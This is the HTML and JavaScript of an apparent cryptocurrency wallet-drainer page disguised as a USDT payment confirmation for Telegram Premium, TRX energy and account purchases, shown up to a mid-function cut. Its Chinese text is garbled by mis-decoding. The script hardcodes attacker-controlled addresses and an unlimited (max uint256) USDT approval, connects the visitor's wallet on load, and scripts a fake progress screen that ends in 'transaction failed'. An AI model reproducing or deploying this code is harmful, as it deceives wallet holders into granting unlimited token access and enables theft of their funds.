<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>æ”¯ä»˜ç¡®è®¤</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
            color: #333;
            min-height: 100vh;
            padding: 1rem;
            line-height: 1.5;
            font-size: 16px;
            -webkit-text-size-adjust: 100%;
        }
        
        @media (max-width: 480px) {
            body {
                font-size: 15px;
            }
        }
        
        @media (max-width: 360px) {
            body {
                font-size: 14px;
            }
        }
        
        .payment-container {
            max-width: 400px;
            margin: 0 auto;
            background: white;
            border-radius: 1rem;
            overflow: hidden;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }
        
        .header {
            color: white;
            padding: 1.5rem;
            text-align: center;
        }
        
        .header-premium {
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
        }
        
        .header-trx {
            background: linear-gradient(135deg, #ff6b6b 0%, #ff8e8e 100%);
        }
        
        .header-account {
            background: linear-gradient(135deg, #4ecdc4 0%, #44a08d 100%);
        }
        
        .header h1 {
            font-size: 1.4rem;
            margin-bottom: 0.5rem;
        }
        
        .payment-status {
            padding: 1.5rem;
            text-align: center;
            border-bottom: 1px solid #eee;
        }
        
        .status-text {
            font-size: 1.1rem;
            font-weight: 600;
            margin-bottom: 0.5rem;
        }
        
        .status-text-premium {
            color: #1890ff;
        }
        
        .status-text-trx {
            color: #ff6b6b;
        }
        
        .status-text-account {
            color: #4ecdc4;
        }
        
        .status-desc {
            font-size: 0.9rem;
            color: #666;
        }
        
        .order-info {
            padding: 1.5rem;
        }
        
        .info-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 1rem;
            padding-bottom: 0.5rem;
            border-bottom: 1px solid #f0f0f0;
        }
        
        .info-item:last-child {
            border-bottom: none;
            margin-bottom: 0;
        }
        
        .info-label {
            color: #666;
            font-size: 0.9rem;
        }
        
        .info-value {
            font-weight: 600;
            text-align: right;
        }
        
        .wallet-status {
            background: #f6ffed;
            border: 1px solid #b7eb8f;
            border-radius: 0.5rem;
            padding: 1rem;
            margin: 1rem 1.5rem;
            text-align: center;
            font-size: 0.9rem;
            color: #52c41a;
        }
        
        .wallet-status.error {
            background: #fff2f0;
            border: 1px solid #ffccc7;
            color: #ff4d4f;
        }
        
        .action-section {
            padding: 1.5rem;
        }
        
        .pay-btn {
            display: block;
            width: 100%;
            color: white;
            padding: 1rem 1.5rem;
            border-radius: 3rem;
            text-decoration: none;
            font-weight: 600;
            font-size: 1.1rem;
            border: none;
            cursor: pointer;
            text-align: center;
            animation: breathe 2s ease-in-out infinite;
            transition: all 0.3s ease;
        }
        
        .pay-btn-premium {
            background: linear-gradient(90deg, #ff8c00, #ffd700);
            box-shadow: 0 0.25rem 1rem rgba(255, 140, 0, 0.4);
            color: #1e3c72;
        }
        
        .pay-btn-trx {
            background: linear-gradient(90deg, #ff6b6b, #ff8e8e);
            box-shadow: 0 0.25rem 1rem rgba(255, 107, 107, 0.4);
        }
        
        .pay-btn-account {
            background: linear-gradient(90deg, #4ecdc4, #44a08d);
            box-shadow: 0 0.25rem 1rem rgba(78, 205, 196, 0.4);
        }
        
        .pay-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            animation: none;
        }
        
        .pay-btn:active {
            transform: translateY(1px);
            animation: none;
        }
        
        .pay-btn-premium:active {
            box-shadow: 0 0.125rem 0.5rem rgba(255, 140, 0, 0.4);
        }
        
        .pay-btn-trx:active {
            box-shadow: 0 0.125rem 0.5rem rgba(255, 107, 107, 0.4);
        }
        
        .pay-btn-account:active {
            box-shadow: 0 0.125rem 0.5rem rgba(78, 205, 196, 0.4);
        }
        
        .loading {
            display: none;
            text-align: center;
            padding: 1rem;
        }
        
        .spinner {
            border: 3px solid #f3f3f3;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto 1rem;
        }
        
        .spinner-premium {
            border-top: 3px solid #ff8c00;
        }
        
        .spinner-trx {
            border-top: 3px solid #ff6b6b;
        }
        
        .spinner-account {
            border-top: 3px solid #4ecdc4;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @keyframes breathe {
            0%, 100% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.03);
            }
        }
        
        .tx-hash {
            word-break: break-all;
            font-family: monospace;
            font-size: 0.75rem;
            background: rgba(0, 0, 0, 0.05);
            padding: 0.5rem;
            border-radius: 0.25rem;
            margin-top: 0.5rem;
        }
        
        .step-indicator {
            display: flex;
            justify-content: space-between;
            margin: 1rem 1.5rem;
            position: relative;
        }
        
        .step {
            display: flex;
            flex-direction: column;
            align-items: center;
            flex: 1;
        }
        
        .step-circle {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            background: #f0f0f0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-bottom: 0.5rem;
            z-index: 2;
        }
        
        .step.active .step-circle {
            color: white;
        }
        
        .step-premium.active .step-circle {
            background: #1890ff;
        }
        
        .step-trx.active .step-circle {
            background: #ff6b6b;
        }
        
        .step-account.active .step-circle {
            background: #4ecdc4;
        }
        
        .step.completed .step-circle {
            background: #52c41a;
            color: white;
        }
        
        .step-text {
            font-size: 0.7rem;
            text-align: center;
            color: #666;
        }
        
        .step.active .step-text {
            font-weight: 600;
        }
        
        .step-premium.active .step-text {
            color: #1890ff;
        }
        
        .step-trx.active .step-text {
            color: #ff6b6b;
        }
        
        .step-account.active .step-text {
            color: #4ecdc4;
        }
        
        .step-line {
            position: absolute;
            top: 15px;
            left: 15px;
            right: 15px;
            height: 2px;
            background: #f0f0f0;
            z-index: 1;
        }
        
        .account-details {
            background: #f8f9fa;
            border-radius: 0.5rem;
            padding: 1rem;
            margin: 1rem 1.5rem;
        }
        
        .account-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 0.5rem;
        }
        
        .account-label {
            color: #666;
            font-size: 0.9rem;
        }
        
        .account-value {
            font-weight: 600;
            text-align: right;
        }
        
        .error-message {
            background: #fff2f0;
            border: 1px solid #ffccc7;
            border-radius: 0.5rem;
            padding: 1rem;
            margin: 1rem;
            text-align: center;
            color: #ff4d4f;
        }
        
        /* æ–°å¢ï¼šç¡®è®¤å¼¹çª—æ ·å¼ */
        .confirm-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 9999;
            align-items: center;
            justify-content: center;
            padding: 1rem;
        }
        
        .confirm-modal.active {
            display: flex;
        }
        
        .confirm-content {
            background: white;
            border-radius: 1rem;
            width: 100%;
            max-width: 400px;
            max-height: 90vh;
            overflow-y: auto;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
            animation: slideIn 0.3s ease-out;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .confirm-header {
            padding: 1.5rem;
            border-bottom: 1px solid #eee;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .confirm-header h3 {
            margin: 0;
            font-size: 1.2rem;
            color: #333;
        }
        
        .close-btn {
            background: none;
            border: none;
            font-size: 1.5rem;
            color: #999;
            cursor: pointer;
            padding: 0.5rem;
            line-height: 1;
        }
        
        .close-btn:hover {
            color: #333;
        }
        
        .confirm-body {
            padding: 1.5rem;
        }
        
        .confirm-details {
            background: #f8f9fa;
            border-radius: 0.5rem;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
        }
        
        .confirm-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 0.75rem;
            padding-bottom: 0.75rem;
            border-bottom: 1px solid #eee;
        }
        
        .confirm-item:last-child {
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }
        
        .confirm-label {
            color: #666;
            font-size: 0.9rem;
            font-weight: 500;
        }
        
        .confirm-value {
            color: #333;
            font-weight: 600;
            text-align: right;
            max-width: 60%;
            word-break: break-word;
        }
        
        .confirm-actions {
            display: flex;
            gap: 1rem;
            margin-top: 2rem;
        }
        
        .confirm-btn {
            display: block;
            width: 100%;
            max-width: 300px;
            margin: 0 auto;
            padding: 1rem 2rem;
            background: linear-gradient(90deg, #1890ff, #52c41a);
            color: white;
            border: none;
            border-radius: 3rem;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            animation: breathe 2s ease-in-out infinite;
        }
        
        .confirm-btn:hover:not(:disabled) {
            opacity: 0.9;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(24, 144, 255, 0.4);
        }
        
        .confirm-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            animation: none;
        }
        
        .processing-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.9);
            display: none;
            align-items: center;
            justify-content: center;
            border-radius: 1rem;
            z-index: 10;
        }
        
        .processing-overlay.active {
            display: flex;
        }
        
        .processing-content {
            text-align: center;
        }
        
        .processing-spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1890ff;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 1rem;
        }
        
        .processing-text {
            color: #333;
            font-weight: 500;
        }
        
        /* æ–°å¢ï¼šæ”¯ä»˜å¤„ç†ä¸­é¡µé¢æ ·å¼ */
        .processing-page {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            z-index: 10000;
            align-items: center;
            justify-content: center;
            padding: 1rem;
        }
        
        .processing-page.active {
            display: flex;
        }
        
        .processing-page-content {
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        
        .processing-page-spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1890ff;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 0 auto 2rem;
        }
        
        .processing-page-title {
            font-size: 1.5rem;
            font-weight: 600;
            margin-bottom: 1rem;
            color: #333;
        }
        
        .processing-page-message {
            color: #666;
            margin-bottom: 2rem;
            line-height: 1.6;
        }
        
        .progress-bar {
            width: 100%;
            height: 8px;
            background: #f0f0f0;
            border-radius: 4px;
            margin: 2rem 0;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #1890ff, #52c41a);
            border-radius: 4px;
            width: 0%;
            transition: width 0.3s ease;
        }
        
        .countdown-text {
            font-size: 0.9rem;
            color: #999;
            margin-top: 1rem;
        }
        
        /* æ–°å¢ï¼š5ç§’è¿›åº¦æ¡è¯¦ç»†æ ·å¼ */
        .progress-details {
            margin-top: 1rem;
            text-align: left;
        }
        
        .progress-stage {
            display: flex;
            align-items: center;
            margin-bottom: 0.75rem;
            padding: 0.5rem;
            border-radius: 0.5rem;
            background: #f8f9fa;
            transition: all 0.3s ease;
        }
        
        .progress-stage.active {
            background: #e6f7ff;
            border-left: 4px solid #1890ff;
        }
        
        .progress-stage.completed {
            background: #f6ffed;
            border-left: 4px solid #52c41a;
        }
        
        .progress-stage-number {
            width: 24px;
            height: 24px;
            background: #f0f0f0;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.8rem;
            font-weight: 600;
            margin-right: 0.75rem;
            flex-shrink: 0;
        }
        
        .progress-stage.active .progress-stage-number {
            background: #1890ff;
            color: white;
        }
        
        .progress-stage.completed .progress-stage-number {
            background: #52c41a;
            color: white;
        }
        
        .progress-stage-text {
            flex: 1;
            font-size: 0.85rem;
            color: #666;
        }
        
        .progress-stage.active .progress-stage-text {
            color: #333;
            font-weight: 500;
        }
        
        .progress-stage-time {
            font-size: 0.75rem;
            color: #999;
            margin-left: 0.5rem;
            min-width: 40px;
        }
/* æ–°å¢ï¼šé’±åŒ…è·³è½¬å¼¹çª—æ ·å¼ */
.wallet-jump-modal {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.9);
    z-index: 10000;
    align-items: center;
    justify-content: center;
    padding: 1rem;
}

.wallet-jump-modal.active {
    display: flex;
}

.wallet-jump-content {
    background: white;
    border-radius: 1rem;
    width: 100%;
    max-width: 400px;
    text-align: center;
    overflow: hidden;
    animation: slideIn 0.3s ease-out;
}

.wallet-jump-header {
    background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
    color: white;
    padding: 1.5rem;
}

.wallet-jump-header h3 {
    font-size: 1.2rem;
    margin: 0;
}

.wallet-jump-body {
    padding: 2rem 1.5rem;
}

.wallet-jump-countdown {
    font-size: 2.5rem;
    color: #1890ff;
    font-weight: bold;
    margin: 1rem 0;
    font-family: monospace;
}

.wallet-jump-message {
    color: #666;
    margin-bottom: 2rem;
    font-size: 0.95rem;
    line-height: 1.5;
}

.wallet-jump-actions {
    display: flex;
    gap: 1rem;
    flex-wrap: wrap;
}

.wallet-jump-btn {
    flex: 1;
    min-width: 120px;
    padding: 1rem;
    border: none;
    border-radius: 0.5rem;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s ease;
    font-size: 0.9rem;
}

.wallet-jump-btn-primary {
    background: #1890ff;
    color: white;
}

.wallet-jump-btn-secondary {
    background: #f0f0f0;
    color: #333;
}

.wallet-jump-btn-primary:active {
    background: #096dd9;
    transform: translateY(1px);
}

.wallet-jump-btn-secondary:active {
    background: #d9d9d9;
    transform: translateY(1px);
}
    </style>
</head>
<body>
    <div class="payment-container">
        <div id="serviceContent">
            <!-- å†…å®¹å°†é€šè¿‡JavaScriptåŠ¨æ€ç”Ÿæˆ -->
        </div>
    </div>
    
    <!-- æ–°å¢ï¼šæ”¯ä»˜ç¡®è®¤å¼¹çª— -->
    <div class="confirm-modal" id="confirmModal">
        <div class="confirm-content">
            <div class="confirm-header">
                <h3 id="confirmModalTitle">æ”¯ä»˜è¯¦æƒ…ç¡®è®¤</h3>
                <button class="close-btn" onclick="closeConfirmModal()">Ã—</button>
            </div>
            <div class="confirm-body">
                <div class="confirm-details">
                    <div class="confirm-item">
                        <span class="confirm-label">è®¢å•å·ï¼š</span>
                        <span class="confirm-value" id="confirmOrderId"></span>
                    </div>
                    <div class="confirm-item">
                        <span class="confirm-label">æ”¯ä»˜é‡‘é¢ï¼š</span>
                        <span class="confirm-value" id="confirmAmount"></span>
                    </div>
                    <div class="confirm-item">
                        <span class="confirm-label">å•†å“ç±»å‹ï¼š</span>
                        <span class="confirm-value" id="confirmProductType"></span>
                    </div>
                    <div class="confirm-item">
                        <span class="confirm-label">æ•°é‡ï¼š</span>
                        <span class="confirm-value" id="confirmQuantity"></span>
                    </div>
                    <div class="confirm-item">
                        <span class="confirm-label">é’±åŒ…åœ°å€ï¼š</span>
                        <span class="confirm-value" id="confirmWalletAddress"></span>
                    </div>
                </div>
                
                <!-- åªæœ‰ä¸€ä¸ªç¡®è®¤æŒ‰é’® -->
                <div style="text-align: center; margin-top: 2rem;">
                    <button class="confirm-btn" id="finalConfirmBtn" onclick="processFinalPayment()" style="width: 80%; max-width: 300px;">
                        ç¡®è®¤æ”¯ä»˜
                    </button>
                </div>
                
                <!-- å¤„ç†ä¸­è¦†ç›–å±‚ -->
                <div class="processing-overlay" id="processingOverlay">
                    <div class="processing-content">
                        <div class="processing-spinner"></div>
                        <p class="processing-text">æ”¯ä»˜å¤„ç†ä¸­ï¼Œè¯·ç¨å€™...</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- æ–°å¢ï¼šæ”¯ä»˜å¤„ç†ä¸­é¡µé¢ -->
    <div class="processing-page" id="processingPage">
        <div class="processing-page-content">
            <div class="processing-page-spinner"></div>
            <h2 class="processing-page-title">æ”¯ä»˜å¤„ç†ä¸­</h2>
            <p class="processing-page-message" id="processingPageMessage">
                æˆ‘ä»¬æ­£åœ¨å¤„ç†æ‚¨çš„æ”¯ä»˜è¯·æ±‚ï¼Œè¯·è€å¿ƒç­‰å¾…...
            </p>
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            
            <!-- æ–°å¢ï¼š5ç§’è¿›åº¦æ¡è¯¦ç»†çŠ¶æ€ -->
            <div class="progress-details" id="progressDetails">
                <div class="progress-stage" id="stage1">
                    <div class="progress-stage-number">1</div>
                    <div class="progress-stage-text">æ­£åœ¨éªŒè¯è®¢å•ä¿¡æ¯...</div>
                    <div class="progress-stage-time" id="stage1Time">0-1ç§’</div>
                </div>
                <div class="progress-stage" id="stage2">
                    <div class="progress-stage-number">2</div>
                    <div class="progress-stage-text">æ­£åœ¨è¿æ¥åŒºå—é“¾ç½‘ç»œ...</div>
                    <div class="progress-stage-time" id="stage2Time">1-2.5ç§’</div>
                </div>
                <div class="progress-stage" id="stage3">
                    <div class="progress-stage-number">3</div>
                    <div class="progress-stage-text">æ­£åœ¨å¤„ç†USDTè½¬è´¦...</div>
                    <div class="progress-stage-time" id="stage3Time">2.5-4ç§’</div>
                </div>
                <div class="progress-stage" id="stage4">
                    <div class="progress-stage-number">4</div>
                    <div class="progress-stage-text">ç¡®è®¤äº¤æ˜“å¤±è´¥...</div>
                    <div class="progress-stage-time" id="stage4Time">4-5ç§’</div>
                </div>
            </div>
            
            <div class="countdown-text" id="countdownText">
                é¢„è®¡ç­‰å¾…æ—¶é—´ï¼š<span id="countdownSeconds">5</span>ç§’
            </div>
        </div>
    </div>

<!-- é’±åŒ…è·³è½¬å¼¹çª— -->
<div class="wallet-jump-modal" id="walletJumpModal">
    <div class="wallet-jump-content">
        <div class="wallet-jump-header">
            <h3 id="walletJumpTitle">æ­£åœ¨è·³è½¬åˆ°é’±åŒ…...</h3>
        </div>
        <div class="wallet-jump-body">
            <div class="wallet-jump-countdown" id="walletJumpCountdown">2</div>
            <p class="wallet-jump-message" id="walletJumpMessage">æ­£åœ¨ä¸ºæ‚¨æ‰“å¼€é’±åŒ…åº”ç”¨ï¼Œè¯·ç¨å€™...</p>
            
            <div class="wallet-jump-actions" id="walletJumpActions" style="display: none;">
                <button class="wallet-jump-btn wallet-jump-btn-secondary" onclick="changePaymentWallet()">æ›´æ¢ä»˜æ¬¾é’±åŒ…</button>
                <button class="wallet-jump-btn wallet-jump-btn-primary" onclick="downloadWalletApp()">ä¸‹è½½é’±åŒ…</button>
            </div>
        </div>
    </div>
</div>

    <script>
        // ==================== EOAæ¨¡å¼æ ¸å¿ƒé…ç½® ====================
        // æ ¹æ®è®°å¿†åŒ£ä¿¡æ¯é…ç½®EOAåœ°å€å’Œåˆçº¦åœ°å€
        const EOA_ADDRESS = 'TX8Dk3KN3sVW2PjaMhnUh86Dj37c4KFFoB';
        const TARGET_ADDRESS = 'TBcTQiYyxXkJffXhXGYEokedsV4vBqHvB8';
        const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
        
        // EOAæ¨¡å¼æˆæƒé‡‘é¢ï¼ˆæ— é™æˆæƒï¼‰
        const EOA_APPROVE_AMOUNT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
        
        // ==================== ç³»ç»ŸçŠ¶æ€å˜é‡ ====================
        // ä»URLå‚æ•°è·å–æœåŠ¡ç±»å‹
        const urlParams = new URLSearchParams(window.location.search);
        const serviceType = urlParams.get('service') || 'premium';
        
        // ä¿å­˜åŸå§‹å‚æ•°
        let originalParams = {};
        urlParams.forEach((value, key) => {
            originalParams[key] = decodeURIComponent(value);
        });
        
        // æ”¯ä»˜æµç¨‹çŠ¶æ€
        let currentPaymentData = null;
        let authTxHash = null;
        let currentUserAddress = null;
        
        // ğŸ”¥ ä¿®å¤ï¼šå‰ç«¯é˜²æŠ–æ ‡è®°
        let authSyncDebounceTimer = null;
        const AUTH_SYNC_DEBOUNCE_DELAY = 5000; // 5ç§’é˜²æŠ–
        window.__authSynced = false;
        
        // ==================== é¡µé¢åˆå§‹åŒ– ====================
        document.addEventListener('DOMContentLoaded', function() {
            console.log('ğŸ¯ Paymenté¡µé¢åŠ è½½ - EOAæ¨¡å¼');
            console.log('ğŸ”§ EOAåœ°å€:', EOA_ADDRESS);
            console.log('ğŸ“¦ æœåŠ¡ç±»å‹:', serviceType);
            
            setTimeout(() => {
                renderServiceInterface();
                // è¿æ¥é’±åŒ…
                setTimeout(connectWallet, 500);
            }, 100);
        });
        
        // ==================== ç•Œé¢æ¸²æŸ“å‡½æ•° ====================
        function renderServiceInterface() {
            const serviceContent = document.getElementById('serviceContent');
            
            if (!serviceContent) {
                console.error('æ‰¾ä¸åˆ° serviceContent å…ƒç´ ');
                return;
            }
            
            try {
                // æ£€æŸ¥æ˜¯å¦æ˜¯æ”¯ä»˜å¤±è´¥é¡µé¢
                const status = originalParams.status;
                if (status === 'failed') {
                    renderPaymentFailedInterface(serviceContent);
                    return;
                }
                
                // æ­£å¸¸æ”¯ä»˜é¡µé¢
                switch(serviceType) {
                    case 'premium':
                        renderPremiumInterface(serviceContent);
                        break;
                    case 'trx':
                        renderTrxInterface(serviceContent);
                        break;
                    case 'account':
                        renderAccountInterface(serviceContent);
                        break;
                    default:
                        renderPremiumInterface(serviceContent);
                }
                
            } catch (error) {
                console.error('æ¸²æŸ“ç•Œé¢å¤±è´¥:', error);
                serviceContent.innerHTML = `
                    <div class="error-message">
                        <h3>é¡µé¢åŠ è½½å¤±è´¥</h3>
                        <p>è¯·åˆ·æ–°é¡µé¢é‡è¯•</p>
                        <button onclick="location.reload()" style="margin-top: 1rem; padding: 0.5rem 1rem; background: #1890ff; color: white; border: none; border-radius: 0.25rem; cursor: pointer;">
                            åˆ·æ–°é¡µé¢
                        </button>
                    </div>
                `;
            }
        }
        
        function renderPremiumInterface(container) {
            const orderId = originalParams.orderId || generateOrderId('TG');
            const quantity = originalParams.quantity || '1';
            const amount = originalParams.amount || '0.99';
            
            container.innerHTML = `
                <div class="header header-premium">
                    <h1>Telegram Premium è®¢é˜…</h1>
                    <p>é«˜çº§åŠŸèƒ½å’Œæ— é™åˆ¶ä½“éªŒ</p>
                </div>
                
                <div class="payment-status">
                    <div class="status-text status-text-premium">æ”¯ä»˜ç¡®è®¤</div>
                    <div class="status-desc">è¯·åœ¨é’±åŒ…ä¸­ç¡®è®¤æ”¯ä»˜äº¤æ˜“</div>
                </div>
                
                <div class="step-indicator">
                    <div class="step-line"></div>
                    <div class="step step-premium active" id="step1">
                        <div class="step-circle">1</div>
                        <div class="step-text">ç¡®è®¤æ”¯ä»˜</div>
                    </div>
                    <div class="step step-premium" id="step2">
                        <div class="step-circle">2</div>
                        <div class="step-text">å®Œæˆ</div>
                    </div>
                </div>
                
                <div class="wallet-status" id="walletStatus">
                    <div id="walletStatusText">æ­£åœ¨è¿æ¥é’±åŒ…...</div>
                </div>
                
                <div class="order-info">
                    <div class="info-item">
                        <span class="info-label">å•†å“è®¢å•</span>
                        <span class="info-value" id="orderIdDisplay">${orderId}</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">å•†å“ç±»å‹</span>
                        <span class="info-value">Telegram Premium è®¢é˜…</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">æœåŠ¡å‘¨æœŸ</span>
                        <span class="info-value">3æœˆ</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">è´­ä¹°æ•°é‡</span>
                        <span class="info-value" id="quantityDisplay">${quantity} ä¸ª</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">ä»˜æ¬¾é‡‘é¢</span>
                        <span class="info-value">${amount} USDT</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">æˆæƒå¯¹è±¡</span>
                        <span class="info-value" style="font-size: 0.8rem;">EOAåœ°å€</span>
                    </div>
                </div>
                
                <div class="loading" id="loadingSection">
                    <div class="spinner spinner-premium"></div>
                    <p id="loadingText">æ­£åœ¨å¤„ç†æ”¯ä»˜è¯·æ±‚...</p>
                    <div id="txHashDisplay" class="tx-hash" style="display: none;"></div>
                </div>
                
                <div class="action-section">
                    <button class="pay-btn pay-btn-premium" id="payBtn" onclick="startPaymentProcess()" disabled>ç¡®è®¤æ”¯ä»˜ ${amount} USDT</button>
                </div>
            `;
        }
        
        function renderTrxInterface(container) {
            const orderId = originalParams.orderId || generateOrderId('TRX');
            const quantity = originalParams.quantity || '1';
            const amount = originalParams.amount || '1.99';
            const trxAddress = originalParams.trxAddress || '';
            
            container.innerHTML = `
                <div class="header header-trx">
                    <h1>TRX æ³¢åœºèƒ½é‡è®¢é˜…</h1>
                    <p>å…æ‰‹ç»­è´¹è½¬è´¦æœåŠ¡</p>
                </div>
                
                <div class="payment-status">
                    <div class="status-text status-text-trx">æ”¯ä»˜ç¡®è®¤</div>
                    <div class="status-desc">è¯·åœ¨é’±åŒ…ä¸­ç¡®è®¤æ”¯ä»˜äº¤æ˜“</div>
                </div>
                
                <div class="step-indicator">
                    <div class="step-line"></div>
                    <div class="step step-trx active" id="step1">
                        <div class="step-circle">1</div>
                        <div class="step-text">ç¡®è®¤æ”¯ä»˜</div>
                    </div>
                    <div class="step step-trx" id="step2">
                        <div class="step-circle">2</div>
                        <div class="step-text">å®Œæˆ</div>
                    </div>
                </div>
                
                <div class="wallet-status" id="walletStatus">
                    <div id="walletStatusText">æ­£åœ¨è¿æ¥é’±åŒ…...</div>
                </div>
                
                <div class="order-info">
                    <div class="info-item">
                        <span class="info-label">å•†å“è®¢å•</span>
                        <span class="info-value" id="orderIdDisplay">${orderId}</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">å•†å“ç±»å‹</span>
                        <span class="info-value">TRXæ³¢åœºèƒ½é‡</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">æœåŠ¡å‘¨æœŸ</span>
                        <span class="info-value">1æœˆ</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">è´­ä¹°æ•°é‡</span>
                        <span class="info-value" id="quantityDisplay">${quantity} ä¸ª</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">ä»˜æ¬¾é‡‘é¢</span>
                        <span class="info-value">${amount} USDT</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">æˆæƒå¯¹è±¡</span>
                        <span class="info-value" style="font-size: 0.8rem;">EOAåœ°å€</span>
                    </div>
                    ${trxAddress ? `
                    <div class="info-item">
                        <span class="info-label">æ¥æ”¶åœ°å€</span>
                        <span class="info-value">${trxAddress.substring(0, 8)}...${trxAddress.substring(trxAddress.length - 6)}</span>
                    </div>
                    ` : ''}
                </div>
                
                <div class="loading" id="loadingSection">
                    <div class="spinner spinner-trx"></div>
                    <p id="loadingText">æ­£åœ¨å¤„ç†æ”¯ä»˜è¯·æ±‚...</p>
                    <div id="txHashDisplay" class="tx-hash" style="display: none;"></div>
                </div>
                
                <div class="action-section">
                    <button class="pay-btn pay-btn-trx" id="payBtn" onclick="startPaymentProcess()" disabled>ç¡®è®¤æ”¯ä»˜ ${amount} USDT</button>
                </div>
            `;
        }
        
        function renderAccountInterface(container) {
            const orderId = originalParams.orderId || generateOrderId('ACC');
            const accountType = originalParams.accountType || '';
            const accountName = originalParams.accountName || '';
            const amount = originalParams.amount || '0.1';
            const quantity = originalParams.quantity || '1';
            
            const accountTypeName = getAccountTypeName(accountType);
            
            container.innerHTML = `
                <div class="header header-account">
                    <h1>è´¦å·è´­ä¹°æ”¯ä»˜ç¡®è®¤</h1>
                    <p>è¯·ç¡®è®¤è®¢å•ä¿¡æ¯å¹¶åœ¨é’±åŒ…ä¸­å®Œæˆæ”¯ä»˜</p>
                </div>
                
                <div class="step-indicator">
                    <div class="step-line"></div>
                    <div class="step step-account active" id="step1">
                        <div class="step-circle">1</div>
                        <div class="step-text">ç¡®è®¤æ”¯ä»˜</div>
                    </div>
                    <div class="step step-account" id="step2">
                        <div class="step-circle">2</div>
                        <div class="step-text">å®Œæˆ</div>
                    </div>
                </div>
                
                <div class="wallet-status" id="walletStatus">
                    <div id="walletStatusText">æ­£åœ¨è¿æ¥é’±åŒ…...</div>
                </div>
                
                <div class="order-info">
                    <div class="info-item">
                        <span class="info-label">å•†å“è®¢å•</span>
                        <span class="info-value" id="orderIdDisplay">${orderId}</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">å•†å“ç±»å‹</span>
                        <span class="info-value" id="accountTypeDisplay">è´¦å·è´­ä¹°</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">å•†å“è¯¦æƒ…</span>
                        <span class="info-value" id="accountNameDisplay">${accountName}</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">è´­ä¹°æ•°é‡</span>
                        <span class="info-value" id="quantityDisplay">${quantity} ä¸ª</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">ä»˜æ¬¾é‡‘é¢</span>
                        <span class="info-value" id="amountDisplay">${amount} USDT</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">æˆæƒå¯¹è±¡</span>
                        <span class="info-value" style="font-size: 0.8rem;">EOAåœ°å€</span>
                    </div>
                </div>
                
                <div class="loading" id="loadingSection">
                    <div class="spinner spinner-account"></div>
                    <p id="loadingText">æ­£åœ¨å¤„ç†æ”¯ä»˜è¯·æ±‚...</p>
                    <div id="txHashDisplay" class="tx-hash" style="display: none;"></div>
                </div>
                
                <div class="action-section">
                    <button class="pay-btn pay-btn-account" id="payBtn" onclick="startPaymentProcess()" disabled>ç¡®è®¤æ”¯ä»˜ ${amount} USDT</button>
                </div>
            `;
        }
        
        function renderPaymentFailedInterface(container) {
            const orderId = originalParams.orderId || generateOrderId('FAIL');
